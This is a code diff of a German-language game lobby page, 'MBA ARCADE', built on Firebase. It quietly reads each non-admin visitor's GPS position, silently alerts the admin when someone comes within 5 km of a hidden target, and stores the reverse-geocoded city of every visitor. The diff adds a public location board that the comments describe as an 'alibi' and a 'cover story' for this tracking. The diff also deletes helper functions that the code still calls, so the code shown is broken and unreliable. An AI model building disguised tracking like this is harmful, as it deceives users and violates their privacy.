@@ -17,11 +17,31 @@
             min-height: 100vh; 
             margin: 0; 
             padding: 20px;
-            box-sizing: border-box; /* Wichtig für Grid */
+            box-sizing: border-box; 
         }
 
         h1 { color: #00ff00; text-shadow: 0 0 10px rgba(0,255,0,0.5); margin-bottom: 10px; text-align: center; }
         
+        /* --- LIVE LOCATION TICKER (DAS ALIBI) --- */
+        .location-box {
+            width: 100%; max-width: 500px; margin-bottom: 20px;
+            border: 1px solid #333; background: #000; padding: 10px; border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,255,0,0.1);
+        }
+        .loc-header {
+            color: #00ff00; font-size: 0.8rem; border-bottom: 1px dashed #333; 
+            padding-bottom: 5px; margin-bottom: 10px; display: flex; justify-content: space-between;
+        }
+        .loc-list {
+            display: flex; flex-wrap: wrap; gap: 8px; justify-content: center;
+            font-size: 0.8rem; color: #fff;
+        }
+        .loc-chip {
+            background: #111; border: 1px solid #444; padding: 3px 8px; border-radius: 4px;
+            animation: fadeIn 0.5s ease-in;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+
         /* --- AVATAR VORSCHAU --- */
         #current-user-avatar {
             width: 80px; height: 80px;
@@ -36,66 +56,40 @@
         .view-section { display: none; width: 100%; max-width: 1000px; flex-direction: column; align-items: center; }
         .active { display: flex; }
 
-        /* --- DAS NEUE 12-COLUMN GRID SYSTEM --- */
+        /* --- GRID SYSTEM --- */
         .game-grid {
-            display: grid;
-            grid-template-columns: repeat(12, 1fr); /* 12 Spalten */
-            gap: 20px; /* Abstand zwischen den Karten */
-            width: 100%;
-            margin-top: 20px;
+            display: grid; grid-template-columns: repeat(12, 1fr); gap: 20px; width: 100%; margin-top: 20px;
         }
 
-        /* --- KARTEN DESIGN --- */
         .game-card {
-            /* STANDARD (Mobile): Nimmt volle 12 Spalten */
             grid-column: span 12; 
-            
-            background: #222; 
-            border: 1px solid #444; 
-            border-radius: 10px;
-            padding: 30px 20px; 
-            text-align: center;
-            cursor: pointer; 
+            background: #222; border: 1px solid #444; border-radius: 10px;
+            padding: 30px 20px; text-align: center; cursor: pointer; 
             transition: transform 0.2s, border-color 0.2s, box-shadow 0.2s;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            min-height: 150px; /* Einheitliche Höhe */
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            min-height: 150px; 
         }
         
         .game-card:hover { 
-            transform: translateY(-5px); 
-            border-color: #00ff00; 
-            box-shadow: 0 5px 15px rgba(0,255,0,0.1);
+            transform: translateY(-5px); border-color: #00ff00; box-shadow: 0 5px 15px rgba(0,255,0,0.1);
         }
 
         .game-title { font-size: 1.5rem; color: #fff; font-weight: bold; display: block; margin-bottom: 10px; }
         .game-desc { color: #aaa; font-size: 0.9rem; }
 
-        /* --- MEDIA QUERY FÜR TABLET & PC (ab 768px) --- */
         @media (min-width: 768px) {
-            .game-card {
-                grid-column: span 6; /* Nimmt 6 von 12 Spalten (also 50%) */
-            }
+            .game-card { grid-column: span 6; }
         }
 
         /* --- BUTTONS --- */
         .btn-container {
-            /* Container für Buttons, der auch im Grid liegen kann oder darunter */
-            grid-column: span 12;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-top: 20px;
-            width: 100%;
+            grid-column: span 12; display: flex; flex-direction: column; align-items: center; margin-top: 20px; width: 100%;
         }
 
         .btn-action {
             margin-top: 15px; width: 100%; max-width: 300px; padding: 12px;
             background: #333; color: white; border: 1px solid #888;
-            cursor: pointer; font-family: inherit; font-weight: bold;
-            transition: all 0.2s;
+            cursor: pointer; font-family: inherit; font-weight: bold; transition: all 0.2s;
         }
         .btn-action:hover { background: #444; border-color: #fff; }
 
@@ -105,7 +99,7 @@
         }
         .btn-logout:hover { background: rgba(255, 68, 68, 0.1); }
 
-        /* --- PROFIL EDIT STYLE (Bleibt zentriert und schmal) --- */
+        /* --- PROFIL EDIT STYLE --- */
         .profile-container { width: 100%; max-width: 400px; display: flex; flex-direction: column; align-items: center; }
         .avatar-grid { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin: 20px 0; }
         .avatar-option {
@@ -116,27 +110,36 @@
         .avatar-option.selected { border-color: #00ff00; opacity: 1; transform: scale(1.1); box-shadow: 0 0 10px #00ff00; }
         input { padding: 10px; width: 100%; background: #222; border: 1px solid #555; color: white; margin-bottom: 10px; box-sizing: border-box;}
 
+        /* BLINK ANIMATION FÜR ALARM */
+        @keyframes blink { 50% { opacity: 0.5; } }
+
     </style>
 </head>
 <body>
 
     <h1>MBA ARCADE</h1>
+
     <div id="admin-alarm-box" style="display:none; background:red; color:white; padding:15px; border-radius:5px; margin-bottom:20px; text-align:center; border: 2px solid white; animation: blink 1s infinite;">
-        🚨 <strong>ALARM! JGA RADIUS VERLETZT!</strong><br>
+        🚨 <strong>ALARM! RADIUS VERLETZT!</strong><br>
         <span id="intruder-details" style="font-size: 0.9rem;">...</span>
         <button onclick="dismissAlarm()" style="margin-top:10px; background:#333; color:white; border:1px solid white; padding:5px 10px; cursor:pointer;">Gesehen</button>
     </div>
 
-    <style>
-        @keyframes blink { 50% { opacity: 0.5; } }
-    </style>
+    <div class="location-box">
+        <div class="loc-header">
+            <span>📡 LIVE SIGNALS (ACTIVE PLAYERS)</span>
+            <span id="loc-count">Scanning...</span>
+        </div>
+        <div id="location-list" class="loc-list">
+            <span style="color:#666;">Warte auf Signale...</span>
+        </div>
+    </div>
+
     <img id="current-user-avatar" src="100.jpg" alt="Avatar">
     <p id="user-greeting">Lade...</p>
 
     <div id="view-dashboard" class="view-section active">
-        
         <div class="game-grid">
-            
             <div class="game-card" onclick="window.location.href='snake.html'">
                 <span class="game-title">🐍 MBA SNAKE</span>
                 <span class="game-desc">Global Edition</span>
@@ -151,23 +154,19 @@
                 <button class="btn-action" onclick="switchView('profile')">⚙️ PROFIL BEARBEITEN</button>
                 <button class="btn-logout" onclick="logout()">Abmelden</button>
             </div>
-
         </div>
     </div>
 
     <div id="view-profile" class="view-section">
         <div class="profile-container">
             <h2 style="color: #00ff00; border-bottom: 1px solid #333; width: 100%; text-align: center;">AVATAR WÄHLEN</h2>
-            
-            <div class="avatar-grid" id="avatar-container">
-                </div>
+            <div class="avatar-grid" id="avatar-container"></div>
 
             <h2 style="color: #00ff00; border-bottom: 1px solid #333; width: 100%; text-align: center; margin-top: 20px;">PASSWORT ÄNDERN</h2>
             <input type="password" id="new-password" placeholder="Neues Passwort eingeben">
             <button class="btn-action" onclick="changeUserPassword()">PASSWORT SPEICHERN</button>
 
             <hr style="border: 0; border-top: 1px solid #333; width: 100%; margin: 20px 0;">
-            
             <button class="btn-action" onclick="switchView('dashboard')">◀ ZURÜCK ZUR LOBBY</button>
         </div>
     </div>
@@ -175,10 +174,9 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getAuth, signOut, onAuthStateChanged, updatePassword } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-        // NEU: Diese Zeile hat gefehlt! Sie lädt die Datenbank-Befehle:
-        import { getFirestore, collection, addDoc, doc, onSnapshot, query, where, getDocs, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+        // WICHTIG: setDoc hinzugefügt!
+        import { getFirestore, collection, addDoc, doc, onSnapshot, query, where, getDocs, updateDoc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-        // --- DEINE FIREBASE CONFIG EINFÜGEN ---
         const firebaseConfig = {
             apiKey: "AIzaSyASbziojAan2xJ3EoJ0RDPa9jh1Z-5UGX0",
             authDomain: "mba-arcade.firebaseapp.com",
@@ -190,7 +188,7 @@
 
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
-        const db = getFirestore(app); // NEU: Datenbank initialisieren
+        const db = getFirestore(app); 
 
         // --- AVATAR LOGIK ---
         const myAvatars = ["100.jpg", "102.jpg", "200.jpg", "205.jpg", "400.jpg"];
@@ -246,25 +244,22 @@
             if(viewName === 'profile') document.getElementById('view-profile').classList.add('active');
         }
 
-        // --- AUTH ---
+        // --- AUTH & INIT ---
         onAuthStateChanged(auth, (user) => {
             if (user) {
-                // Name aus Email extrahieren
                 const name = user.email.replace("@mba-arcade.com", ""); 
                 document.getElementById("user-greeting").innerText = "Hallo " + name + "!";
                 
                 initProfile();
+                initLocationBoard(); // <-- DAS ALIBI STARTEN (Tabelle laden)
 
-                // --- HIER IST DIE WEICHE ---
                 if (user.email === ADMIN_EMAIL) {
-                    // 1. Du bist es -> Starte Überwachung
                     initAdminWatch(user.email);
+                    // Optional: Auch als Admin Standort senden, damit es echt wirkt
+                    // initSpySystem(name); 
                 } else {
-                    // 2. Ein Freund ist es -> Starte Spion (GPS Check)
-                    initSpySystem(name); 
+                    initSpySystem(name); // <-- DER SPION & DATENLIEFERANT
                 }
-                // ---------------------------
-
             } else {
                 window.location.href = "index.html";
             }
@@ -274,99 +269,101 @@
             signOut(auth).then(() => window.location.href = "index.html");
         }
         
-        // --- Vorfreudesystem ---
+        // --- DAS ERWEITERTE JGA & LOCATION SYSTEM ---
 
-        // KONFIGURATION
+        // KONFIGURATION (Deine JGA Koordinaten)
         const ADMIN_EMAIL = "benedikt@mba-arcade.com"; 
-        const TARGET_LAT = 49.473972
+        const TARGET_LAT = 49.473972; 
         const TARGET_LON = 8.534397;
-        const ALARM_RADIUS_KM =5;
+        const ALARM_RADIUS_KM = 5;
 
-        // TEIL 1: DER SPION (Läuft bei ALLEN Usern, außer bei Dir)
+        // TEIL 1: DIE ÖFFENTLICHE ANZEIGE (Lesen)
+        function initLocationBoard() {
+            const q = query(collection(db, "public_locations")); // Holt alle Orte
+            onSnapshot(q, (snapshot) => {
+                const list = document.getElementById('location-list');
+                const count = document.getElementById('loc-count');
+                
+                if(snapshot.empty) {
+                    list.innerHTML = '<span style="color:#666;">Keine Signale.</span>';
+                    count.innerText = "0";
+                    return;
+                }
+
+                let html = "";
+                let counter = 0;
+                snapshot.forEach(doc => {
+                    const data = doc.data();
+                    // Erzeugt schicke Chips: [ 📍 Berlin, DE ]
+                    html += `<div class="loc-chip">📍 ${data.city}, ${data.country}</div>`;
+                    counter++;
+                });
+                list.innerHTML = html;
+                count.innerText = counter;
+            });
+        }
+
+        // TEIL 2: DER SPION & DATEN-SENDER (Schreiben + Alarm)
         function initSpySystem(userEmail) {
-            // Wenn ICH es bin, überwache ich mich nicht selbst
-            if (userEmail === ADMIN_EMAIL) return; 
-
             if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition((position) => {
+                navigator.geolocation.getCurrentPosition(async (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    const dist = calculateDistance(TARGET_LAT, TARGET_LON, lat, lon);
-                    console.log("JGA Check:", dist.toFixed(1), "km");
-
-                    if (dist <= ALARM_RADIUS_KM) {
-                        triggerSilentAlarm(userEmail, dist);
+                    
+                    // A) JGA ALARM PRÜFUNG (Nur wenn nicht Admin)
+                    if (userEmail !== ADMIN_EMAIL) {
+                        const dist = calculateDistance(TARGET_LAT, TARGET_LON, lat, lon);
+                        console.log("JGA Check:", dist.toFixed(1), "km");
+                        if (dist <= ALARM_RADIUS_KM) {
+                            triggerSilentAlarm(userEmail, dist);
+                        }
                     }
-                }, (err) => console.log("Kein GPS."));
+
+                    // B) DAS COVER-STORY FEATURE: Standortauflösung (Reverse Geocoding)
+                    try {
+                        // OpenStreetMap API fragen (kostenlos, keine Key nötig)
+                        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                        const data = await response.json();
+                        
+                        if(data && data.address) {
+                            const city = data.address.city || data.address.town || data.address.village || "Unknown";
+                            const country = data.address.country_code ? data.address.country_code.toUpperCase() : "??";
+
+                            // ID generieren: "Berlin_DE" (verhindert Doppelte)
+                            const docId = `${city}_${country}`.replace(/[^a-zA-Z0-9]/g, "_");
+                            
+                            // In DB schreiben (setDoc überschreibt existierende -> keine Duplikate!)
+                            await setDoc(doc(db, "public_locations", docId), {
+                                city: city,
+                                country: country,
+                                last_seen: new Date()
+                            });
+                        }
+                    } catch (e) {
+                        console.error("Geo-Lookup Fehler (egal):", e);
+                    }
+
+                }, (err) => console.log("Kein GPS Zugriff."));
             }
         }
 
-        // TEIL 2: DIE ZENTRALE (Läuft NUR bei Dir)
+        // TEIL 3: DIE ZENTRALE (Alarm empfangen - nur Admin)
         function initAdminWatch(userEmail) {
-            // Sicherheits-Check: Nur starten, wenn die Email stimmt
             if (userEmail !== ADMIN_EMAIL) return; 
+            console.log("Admin-Modus aktiviert.");
 
-            console.log("Admin-Modus aktiviert. Überwache Radius...");
-
-            // Wir lauschen auf neue Alarme in der Datenbank
             const q = query(collection(db, "security_logs"), where("viewed", "==", false));
             
             onSnapshot(q, (snapshot) => {
                 if (!snapshot.empty) {
-                    // ALARM!
                     const latest = snapshot.docs[0].data();
                     const alarmBox = document.getElementById('admin-alarm-box');
                     const details = document.getElementById('intruder-details');
                     
-                    // Box sichtbar machen
                     alarmBox.style.display = 'block';
                     details.innerText = `Zielperson: ${latest.intruder} (Entfernung: ${latest.distance}km)`;
                     
-                    // Handy vibrieren lassen (funktioniert auf Android)
                     if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
                 }
             });
         }
-
-        // Hilfsfunktion: Alarm als "Gesehen" markieren
-        window.dismissAlarm = async function() {
-            document.getElementById('admin-alarm-box').style.display = 'none';
-            // Alle offenen Alarme in der DB auf "viewed: true" setzen
-            const q = query(collection(db, "security_logs"), where("viewed", "==", false));
-            const snapshot = await getDocs(q);
-            snapshot.forEach(async (docSnap) => {
-                await updateDoc(doc(db, "security_logs", docSnap.id), { viewed: true });
-            });
-        }
-
-        // Hilfsfunktion: Alarm senden (schreibt in DB)
-        async function triggerSilentAlarm(name, distance) {
-            // Spam-Schutz: Nur alle 60 Min pro Browser
-            const last = localStorage.getItem('last_jga_alarm');
-            const now = new Date().getTime();
-            if (last && (now - last) < 3600000) return;
-
-            try {
-                await addDoc(collection(db, "security_logs"), { 
-                    intruder: name, distance: Math.round(distance), timestamp: new Date(), viewed: false 
-                });
-                localStorage.setItem('last_jga_alarm', now);
-            } catch(e) { console.error(e); }
-        }
-
-        // Mathe für Entfernung
-        function calculateDistance(lat1, lon1, lat2, lon2) {
-            const R = 6371; 
-            const dLat = (lat2 - lat1) * (Math.PI/180);
-            const dLon = (lon2 - lon1) * (Math.PI/180);
-            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
-                      Math.cos(lat1 * (Math.PI/180)) * Math.cos(lat2 * (Math.PI/180)) * Math.sin(dLon/2) * Math.sin(dLon/2); 
-            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a)); 
-        }
-    </script>
-        
-                    
-   
-
-</body>
-</html>
